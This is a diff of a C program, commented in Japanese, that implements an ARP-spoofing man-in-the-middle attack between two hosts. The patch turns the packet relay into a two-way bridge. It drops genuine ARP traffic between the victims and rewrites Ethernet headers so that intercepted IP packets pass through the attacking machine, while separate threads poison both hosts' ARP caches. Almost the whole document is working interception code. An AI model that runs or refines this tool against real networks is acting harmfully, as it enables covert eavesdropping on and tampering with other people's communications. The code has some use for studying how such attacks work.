@@ -162,8 +162,10 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         }
         
         //送信者かつ受信者のIPv4アドレスをチェック
-        if(*(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip){
-            //端末BへのARPパケットだったら、無視する。（フォワーディングしてあげない）
+        int isAtoB = *(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip;
+        int isBtoA = *(in_addr_t *)arp->arp_spa == rec_ip && *(in_addr_t *)arp->arp_tpa == send_ip;
+        if(isAtoB || isBtoA){
+            //AとBの間のARPパケットなので、無視する。（仲介してあげない）
             DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
             return (-1);
         }
@@ -186,14 +188,20 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         tempS.s_addr = iphdr->saddr;
         tempR.s_addr = iphdr->daddr;
         DebugPrintf("IP PACKET: %s to %s\n",inet_ntoa(tempS), inet_ntoa(tempR));
-        
+       
+        int isAtoB = (iphdr->saddr == send_ip && iphdr->daddr == rec_ip); 
+        int isBtoA = (iphdr->saddr == rec_ip && iphdr->daddr == send_ip); 
         //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
-        if(iphdr->saddr == send_ip && iphdr->daddr == rec_ip){
+        if(isAtoB || isBtoA){
             DebugPrintf("[%d]recv:MITM IP PACKET:%dbytes\n",deviceNo,size);
             printf("MITM IP PACKET\n");
             int ii=0;
-            //宛先は普通に端末BのMACアドレス
-            for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
+            //宛先は、AtoBならBに、BtoAならAのMACアドレスにする
+            if(isAtoB){
+                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
+            }else{
+                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = send_mac[ii];
+            }
             //送信元MACアドレスは自分
             for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
             //IPアドレスは、送信元が端末A、宛先が端末Bになってるので変える必要はない
@@ -526,7 +534,6 @@ int main(int argc,char *argv[],char *envp[])
     pthread_t arpTid;
     pthread_t arpTid_r;
     pthread_t bridgeTid;
-    pthread_t bridgeTid_r;   
     pthread_attr_t  attr;
     
     pthread_attr_init(&attr);
@@ -594,25 +601,10 @@ int main(int argc,char *argv[],char *envp[])
     memcpy(arg_bridge.mac_d, mac_A, 6);
     memcpy(arg_bridge.mac_s, mac_B, 6);
    
-    //A→BのARPスプーフィング開始。ARPリクエストを送りつける
+    //双方向ブリッジ開始
     if((status=pthread_create(&bridgeTid,&attr, StartMITMBridge, &arg_bridge))!=0){
         DebugPrintf("pthread_create:%s\n",strerror(status));
     }
-
-    //スレッド用引数の準備
-    struct argArp arg_bridge_r;
-    arg_bridge_r.soc  = Device[0].soc;
-    arg_bridge_r.ip_d = recIp.s_addr;
-    arg_bridge_r.ip_s = sendIp.s_addr;
-    //MACaddrのコピー
-    memcpy(arg_bridge_r.mac_d, mac_B, 6);
-    memcpy(arg_bridge_r.mac_s, mac_A, 6);
-  
-    //B→AのARPスプーフィング開始。ARPリクエストを送りつける
-    if((status=pthread_create(&bridgeTid_r,&attr, StartMITMBridge, &arg_bridge_r))!=0){
-        DebugPrintf("pthread_create:%s\n",strerror(status));
-    }
-    
     
     //Bridge();
     //---ブリッジここまで
@@ -622,7 +614,6 @@ int main(int argc,char *argv[],char *envp[])
     pthread_join(arpTid     , NULL);
     pthread_join(arpTid_r   , NULL);
     pthread_join(bridgeTid  , NULL);
-    pthread_join(bridgeTid_r, NULL);
     
     close(Device[0].soc);
     close(Device[1].soc);
